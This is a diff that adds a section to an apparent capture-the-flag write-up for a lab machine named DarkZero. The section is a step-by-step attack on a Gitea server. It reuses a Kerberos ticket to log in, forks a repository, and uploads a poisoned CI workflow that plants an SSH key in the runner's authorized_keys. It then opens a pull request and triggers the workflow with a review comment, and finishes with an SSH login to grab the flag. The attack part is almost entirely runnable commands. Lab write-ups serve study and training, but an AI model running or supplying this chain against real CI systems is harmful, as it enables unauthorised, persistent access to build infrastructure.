@@ -213,7 +213,167 @@ curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
 <!-- PAGE BREAK -->
 <div style="page-break-after: always;"></div>
 
-## 6. Lessons Learned
+## Gitea via Kerberos → CI/CD → user
+
+### Confirm inherited TGT
+
+```bash
+klist
+```
+
+**3.14 — verify service ticket**
+
+bash
+
+```bash
+getent hosts gitea.darkzero.ext
+kvno HTTP/gitea.darkzero.ext
+```
+
+**3.15 — SSPI login**
+
+bash
+
+```bash
+curl -s --negotiate -u : -c /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/user/login?auth_with_sspi=1" \
+  -o /dev/null -w "%{http_code}\n"
+cat /tmp/gitea_cookies.txt
+```
+
+**3.16 — identity + repos**
+
+bash
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/user" | python3 -m json.tool
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/search?limit=50" \
+  | python3 -c "import sys,json; [print(r['full_name'], '| private:', r['private']) for r in json.load(sys.stdin)['data']]"
+```
+
+**3.17 — repo perms + workflow dir**
+
+bash
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('perms:', d.get('permissions')); print('has_actions:', d.get('has_actions'))"
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/contents/.gitea/workflows" \
+  | python3 -m json.tool
+```
+
+**3.18 — read workflow**
+
+bash
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  "http://gitea.darkzero.ext:3000/DarkZero/DarkZero-Campaigns/raw/branch/main/.gitea/workflows/main.yml"
+```
+
+**3.19 — fork** — ⚠ NOTE: keep `CSRF=...` on its OWN line. A trailing backslash here merges it into curl and sends an empty token (the fork silently fails).
+
+bash
+
+```bash
+CSRF=$(grep _csrf /tmp/gitea_cookies.txt | awk '{print $7}')
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -H "X-Csrf-Token: $CSRF" \
+  -d '{}' \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/forks" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('full_name:', d.get('full_name')); print('perms:', d.get('permissions')); print('message:', d.get('message',''))"
+```
+
+Expect `perms: {'admin': True, 'push': True, 'pull': True}`.
+
+**3.20 — generate SSH key**
+
+bash
+
+```bash
+ssh-keygen -t ed25519 -f /tmp/.runner_key -N '' -C 'ci'
+cat /tmp/.runner_key.pub
+```
+
+**3.21 — write payload workflow** — ⚠ paste YOUR pubkey from above into the echo line:
+
+bash
+
+```bash
+cat > /tmp/foothold.yml << 'EOF'
+name: foothold
+on:
+  pull_request_review_comment:
+    types: [created]
+jobs:
+  foothold:
+    runs-on: ubuntu
+    steps:
+      - run: |
+          install -d -m 700 /home/svc-runner/.ssh
+          echo 'PASTE_YOUR_PUBKEY_HERE' >> /home/svc-runner/.ssh/authorized_keys
+          chmod 600 /home/svc-runner/.ssh/authorized_keys
+          id
+          cat /home/svc-runner/user.txt
+EOF
+cat /tmp/foothold.yml
+```
+
+**3.22 — upload to fork**
+
+bash
+
+```bash
+B64=$(base64 -w0 /tmp/foothold.yml)
+
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -H "X-Csrf-Token: $CSRF" \
+  -d "{\"content\":\"$B64\",\"message\":\"ci\"}" \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/darkzero-ext_josh/DarkZero-Campaigns/contents/.gitea%2Fworkflows%2Ffoothold.yml" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('content',{}).get('name','')); print('msg:', d.get('message',''))"
+```
+
+**3.23 — open PR**
+
+bash
+
+```bash
+PR=$(curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -d '{"title":"CI","body":"update","head":"darkzero-ext_josh:main","base":"main"}' \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls")
+
+PRNUM=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['number'])")
+SHA=$(echo "$PR" | python3 -c "import sys,json; print(json.load(sys.stdin)['head']['sha'])")
+echo "PR=$PRNUM SHA=$SHA"
+```
+
+**3.24 — trigger + collect flag**
+
+bash
+
+```bash
+curl -s --negotiate -u : -b /tmp/gitea_cookies.txt \
+  -X POST -H "Content-Type: application/json" \
+  -d "{\"event\":\"COMMENT\",\"body\":\"go\",\"commit_id\":\"$SHA\"}" \
+  "http://gitea.darkzero.ext:3000/api/v1/repos/DarkZero/DarkZero-Campaigns/pulls/$PRNUM/reviews" \
+  | python3 -c "import sys,json; d=json.load(sys.stdin); print('state:', d.get('state'))"
+
+sleep 15
+
+ssh -i /tmp/.runner_key -o StrictHostKeyChecking=no svc-runner@172.16.20.3 'id; cat ~/user.txt'
+```
+
+---
 <div align="center">
 <br>
 <br>
